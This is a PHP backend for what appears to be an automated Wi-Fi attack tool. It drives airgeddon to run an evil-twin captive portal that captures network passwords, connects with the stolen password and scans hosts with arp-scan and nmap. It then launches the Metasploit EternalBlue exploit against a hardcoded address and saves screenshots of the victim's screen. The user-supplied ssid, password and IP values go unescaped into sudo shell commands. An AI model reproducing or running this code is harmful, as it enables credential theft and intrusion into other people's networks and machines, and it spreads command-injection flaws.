<?php

    define('PATH_SCAN_WIFI', './airgeddon/scanwifi.sh');
    define('PATH_ATTACK_SHELL', './airgeddon/attack.sh');        
    define('ERROR_TIMEOUT_MSG', 'It seems we failed... try it again, choose another attack or increase the timeout');

    function scanWifi()
    {
        shell_exec("sudo rm -rf '/tmp/explorewifi.txt' > /dev/null 2>&1"); 
        shell_exec("sudo rm -rf '/tmp/wnws.txt' > /dev/null 2>&1"); 
        $descriptors = [['pipe', 'r'], ['pipe', 'w'], ['pipe', 'w']];
        $process = proc_open("sudo bash ".PATH_SCAN_WIFI, $descriptors, $pipes); 
        $status = proc_get_status($process);
        if (is_resource($process)) 
        {                    
            fwrite($pipes[0], "\n");
            fwrite($pipes[0], "\n");
            fwrite($pipes[0], "\n");
            fwrite($pipes[0], "2\n");
            fwrite($pipes[0], "2\n");
            fwrite($pipes[0], "\n");                                    
            fwrite($pipes[0], "7\n");
            fwrite($pipes[0], "9\n");
            fwrite($pipes[0], "\n");
            fwrite($pipes[0], "\n");

            while(!file_exists("/tmp/explorewifi.txt"))
            {
                sleep(1);
            }

            sleep(15);
            shell_exec("sudo kill $(ps aux | grep 'airodump-ng' | awk '{print $2}')");      
            
            while(!file_exists("/tmp/wnws.txt"))
            {
                sleep(1);
            }             

            //echo $homepage."<br>";
            shell_exec("sudo rm -rf '/tmp/explorewifi.txt' > /dev/null 2>&1");

            fclose($pipes[1]);                    
            fclose($pipes[0]);
            fclose($pipes[2]); //stderr

            // sleep(10);
        
            //echo "Close!";
            //die();
            //$return_value = proc_close($process);                    
            proc_terminate($process, 9);

            $arr = array();
            foreach(file("/tmp/wnws.txt", FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES) as $line) {
                // do1 stuff here
                $item = explode(",",$line);                
                $arrItem['mac'] =  $item[0];
                $arrItem['chanel'] =  $item[1];
                $arrItem['power'] =  $item[2];
                $arrItem['ssid'] =  $item[3];
                $arrItem['enc'] =  $item[4];                
                $arr[] = $arrItem;                
            }

            return json_encode($arr);
        }        
        return '[]';
    }   
    
    function getwifilist()
    {
        if (file_exists("/tmp/wnws.txt"))
        {
            $arr = array();
            foreach(file("/tmp/wnws.txt", FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES) as $line) {
                // do1 stuff here
                $item = explode(",",$line);                
                $arrItem['mac'] =  $item[0];
                $arrItem['chanel'] =  $item[1];
                $arrItem['power'] =  $item[2];
                $arrItem['ssid'] =  $item[3];
                $arrItem['enc'] =  $item[4];                
                $arr[] = $arrItem;                
            }

            return json_encode($arr);
        }
        return '[]';

    }

    function attack($slelectedValue, $ssid)
    {        
        shell_exec("sudo rm -rf '/tmp/attackStatus.txt' > /dev/null 2>&1");
        shell_exec("sudo rm -rf '/tmp/evil_twin_captive_portal_password-${ssid}.txt' > /dev/null 2>&1"); 
        $descriptors = [['pipe', 'r'], ['pipe', 'w'], ['pipe', 'w']];
        $process = proc_open("sudo bash ".PATH_ATTACK_SHELL, $descriptors, $pipes); 
        $status = proc_get_status($process);
        if (is_resource($process)) 
        {                    
            fwrite($pipes[0], "\n");
            fwrite($pipes[0], "\n");
            fwrite($pipes[0], "\n");
            fwrite($pipes[0], "2\n");
            fwrite($pipes[0], "2\n");
            fwrite($pipes[0], "\n");                                    
            fwrite($pipes[0], "7\n");
            fwrite($pipes[0], "9\n");
            fwrite($pipes[0], "\n");
            fwrite($pipes[0], "\n");
            while(!file_exists("/tmp/explorewifi.txt"))
            {
                sleep(1);
            }

            sleep(15);
            shell_exec("sudo kill $(ps aux | grep 'airodump-ng' | awk '{print $2}')");      
            
            while(!file_exists("/tmp/wnws.txt"))
            {
                sleep(1);
            }             

            //echo $homepage."<br>";
            shell_exec("sudo rm -rf '/tmp/explorewifi.txt' > /dev/null 2>&1");

            fwrite($pipes[0], "$slelectedValue\n");
            fwrite($pipes[0], "2\n");
            fwrite($pipes[0], "N\n");
            fwrite($pipes[0], "Y\n");
            fwrite($pipes[0], "N\n");
            fwrite($pipes[0], "\n");
            fwrite($pipes[0], "\n");
            fwrite($pipes[0], "\n");
            fwrite($pipes[0], "\n");
            fwrite($pipes[0], "/tmp/evil_twin_captive_portal_password-${ssid}.txt\n");
            fwrite($pipes[0], "\n");
            fwrite($pipes[0], "1\n");
            fwrite($pipes[0], "Y\n");
            fwrite($pipes[0], "\n");

            shell_exec("sudo echo ${status['pid']} > '/tmp/pendingprocess.txt'");

            while(!file_exists("/tmp/evil_twin_captive_portal_password-${ssid}.txt"))
            {                
                sleep(1);
            }            

            sleep(1);
            fwrite($pipes[0], "\n");

            fclose($pipes[1]);                    
            fclose($pipes[0]);
            fclose($pipes[2]); //stderr

            // sleep(10);
        
            //echo "Close!";
            //die();
            //$return_value = proc_close($process);              
            proc_terminate($process, 9);

            //return "/tmp/evil_twin_captive_portal_password-${ssid}.txt";
            return "success";
        }        
        return "fail";
    }

    function getAttackStatus() {
        if (file_exists("/tmp/attackStatus.txt"))
        {
            return file_get_contents("/tmp/attackStatus.txt");
        }
        return '';
    }

    function stop($ssid)
    {
        shell_exec("sudo rm -rf '/tmp/evil_twin_captive_portal_password-${ssid}.txt' > /dev/null 2>&1");
        shell_exec("sudo echo 'stop' > '/tmp/evil_twin_captive_portal_password-${ssid}.txt'");
        echo 'success';
    }

    function getattackresult($ssid)
    {
        if(!file_exists("/tmp/evil_twin_captive_portal_password-${ssid}.txt"))
        {
            return '';
        }

        $content = file_get_contents("/tmp/evil_twin_captive_portal_password-${ssid}.txt");   
        if($content === 'stop')
        {
            return 'stop';
        }
        
        $pos = strpos($content, "Password: ");

        // Note our use of ===.  Simply == would not work as expected
        // because the position of 'a' was the 0th (first) character.
        if ($pos === false) {
            return "Not found";
        } 

        $end = strpos($content, "\n", $pos);
        if ($end === false)
        {
            return "Not found";                
        }
        
        $line = substr($content, $pos, $end - $pos);
        $password = str_replace("Password: ", "", $line);
        return $password;             
    }

    function killall()
    {
        shell_exec("sudo kill $(ps aux | grep 'airodump-ng' | awk '{print $2}')");                
    }

    // function safeKillProcess($process, $pipes, )
    // {
    //     $status = proc_get_status($process);
    //     if($status['running'] == true) { //process ran too long, kill it
    //         //close all pipes that are still open
    //         fclose($pipes[1]); //stdout
    //         fclose($pipes[2]); //stderr
    //         //get the parent pid of the process we want to kill
    //         $ppid = $status['pid'];
    //         //use ps to get all the children of this process, and kill them
    //         $pids = preg_split('/\s+/', `ps -o pid --no-heading --ppid $ppid`);
    //         foreach($pids as $pid) {
    //             if(is_numeric($pid)) {
    //                 //echo "Killing $pid\n";
    //                 posix_kill($pid, 9); //9 is the SIGKILL signal
    //             }
    //         }
                
    //         proc_close($process);
    //     }
    // }

    function displayPassword()
    {
        
    }

    function connectWifi($ssid, $password)
    {
        shell_exec("sudo rm -rf '/tmp/connect.txt' > /dev/null 2>&1"); 
        shell_exec("sudo rm -rf '/tmp/ip.txt' > /dev/null 2>&1"); 
        shell_exec("sudo airmon-ng stop wlan0mon");
        shell_exec("sudo airmon-ng stop wlan1mon");
        shell_exec("sudo service NetworkManager restart && sleep 10");
        // echo "nmcli d wifi connect '${ssid}' password ${password} >> /tmp/connect.txt";
        shell_exec("sudo nmcli d wifi connect '${ssid}' password ${password} ifname wlan1>> /tmp/connect.txt 2>&1" );
        $data = file_get_contents('/tmp/connect.txt');
        if(strpos($data, 'Error:') === false) {
            shell_exec("ip -4 addr show wlan1 | grep -oP '(?<=inet\s)\d+(\.\d+){3}' >> /tmp/ip.txt");
            echo "Connected";
        } else {
            echo "Error";
        };
    }

    function eternalBlue() {
        shell_exec("sudo rm -rf '/tmp/toolResult.txt' > /dev/null 2>&1"); 
        shell_exec("sudo rm -rf '/tmp/error-output.txt' > /dev/null 2>&1"); 
        shell_exec("sudo rm -rf '/opt/lampp/htdocs/eviltwin/screenview/t.jpeg' > /dev/null 2>&1"); 
        shell_exec("sudo rm -rf '/opt/lampp/htdocs/eviltwin/screenview/s.jpeg' > /dev/null 2>&1"); 
        $ip = file_get_contents("/tmp/ip.txt");
        $ip =  preg_replace('/\s+/', '', $ip);
        $descriptors = [['pipe', 'r'], ['pipe', 'w'], ["file", "/tmp/error-output.txt", "a"]];
        $process = proc_open(' cd /home/ntdanh && sudo msfconsole', $descriptors, $pipes); 
        $status = proc_get_status($process);
        if (is_resource($process)) 
        {
            fwrite($pipes[0], "use exploit/windows/smb/ms17_010_eternalblue\n");
            fwrite($pipes[0], "set RHOSTS 192.168.1.199\n");
            write($pipes[0], "set LHOST 192.168.1.111\n"); 

            // fwrite($pipes[0], "use exploit/multi/handler\n");
            // fwrite($pipes[0], "set PAYLOAD windows/x64/meterpreter/reverse_tcp\n");
            // fwrite($pipes[0], "set LHOST 192.168.1.219\n");
            // fwrite($pipes[0], "set LPORT 4444\n");


            fwrite($pipes[0], "exploit\n");
            fwrite($pipes[0], "screenshot -p /opt/lampp/htdocs/eviltwin/screenview/t.jpeg\n");
            fwrite($pipes[0], "screenshot  -p /opt/lampp/htdocs/eviltwin/screenview/s.jpeg\n");

            fclose($pipes[0]);
            ob_start();
            $error = stream_get_contents($pipes[1]);
            // echo "<pre>" . $error . "</pre>";
            ob_end_clean();
            fclose($pipes[1]);
            proc_close($process);
            
            if (str_contains($error, 'Exploit completed, but no session was created.')){
                shell_exec("echo Fail >> /tmp/toolResult.txt");
            }
        }
        return '';
    }

    function getToolResult() {
        // if (file_exists("/tmp/toolResult.txt")){
        //     return 'Fail';
        // } else{
            if (file_exists("/opt/lampp/htdocs/eviltwin/screenview/t.jpeg") && file_exists("/opt/lampp/htdocs/eviltwin/screenview/s.jpeg"))
            {
                return "Success";
            } else {
                return '';
            }

        //}
    }
            
    function scanDevice() {
        shell_exec("sudo rm -rf '/tmp/scanDevice.txt' > /dev/null 2>&1"); 
        ob_start();
        $ip = file_get_contents("/tmp/ip.txt");
        $ip =  preg_replace('/\s+/', '', $ip);
        shell_exec("sudo arp-scan --plain -I wlan1 ${ip}/24 >> /tmp/scanDevice.txt ");           
        ob_end_clean();
        $arr = array();
        foreach(file("/tmp/scanDevice.txt", FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES) as $line) {
            $item = explode("\t", $line);
            $arrItem['ip'] =  $item[0];
            $arrItem['mac'] =  $item[1];
            $arrItem['hostname'] =  $item[2];               
            $arr[] = $arrItem; 
        }
        return json_encode($arr);
        // var_dump($arr);
    }

    function getdevicelist()
    {
        if (file_exists("/tmp/scanDevice.txt"))
        {
            $arr = array();
            foreach(file("/tmp/scanDevice.txt", FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES) as $line) {
                $item = explode("\t", $line);
                $arrItem['ip'] =  $item[0];
                $arrItem['mac'] =  $item[1];
                $arrItem['hostname'] =  $item[2];               
                $arr[] = $arrItem; 
            }
            return json_encode($arr);

        }
        return '[]';

    }

    function deviceInfo($hostname, $mac, $ip){
        shell_exec("sudo rm -rf '/tmp/deviceInfo.txt' > /dev/null 2>&1");
        shell_exec("sudo nmap -F -O ${ip}/24 >> /tmp/deviceInfo.txt");        
        $arr = array();
        foreach(file("/tmp/deviceInfo.txt") as $line) {
            //get port
            if (is_numeric($line[0])){
                $arrPort[] = $line;
            }
                        
            //get OS
            if (strpos($line, 'Running') === 0) {
                $OS = explode(":",$line);
                $arr['OS'] = $OS[1];
            }
        }
        $data = file_get_contents("/tmp/deviceInfo.txt");

        $start_pos = strpos($data, 'PORT');
        $end_pos = strpos($data, 'MAC');

        $substring = substr($data, $start_pos, $end_pos - $start_pos );
        
        $arr["vulnResult"] = $substring;

        return json_encode($arr);
    }

    function deviceVuln($ip) 
    {
        shell_exec("sudo rm -rf '/tmp/getVuln.txt' > /dev/null 2>&1");
        shell_exec("sudo nmap --script smb-vuln-ms17-010 -p445 ${ip} >> /tmp/getVuln.txt");
        return 'Start';
    }

    function getVuln() {
        if(file_exists("/tmp/getVuln.txt")){
            $arr = array();
            // foreach(file("/tmp/getVuln.txt") as $line) {
            //     //get port
            //     if (is_numeric($line[0])){
            //         $arrPort[] = $line;
            //     }
                            
            //     //get OS
            //     // if (strpos($line, 'Running') === 0) {
            //     //     $OS = explode(":",$line);
            //     //     $arr['OS'] = $OS[1];
            //     // }

            //     // get name           
            //     // if(strpos($line, "| nbstat:") === 0){
            //     //     $data = explode(",",$line);
            //     //     $name = explode(":" ,$data[0]);
            //     //     $arr['name'] = $name[2];
            //     // }

            
            // }


            $data = file_get_contents("/tmp/getVuln.txt");

            $start_pos = strpos($data, 'PORT');
            $end_pos = strpos($data, 'MAC');

            $substring = substr($data, $start_pos, $end_pos - $start_pos );
            
            $arr["portVuln"] = $substring;

            return json_encode($arr);
        } else {
            return '';
        }
    }

?>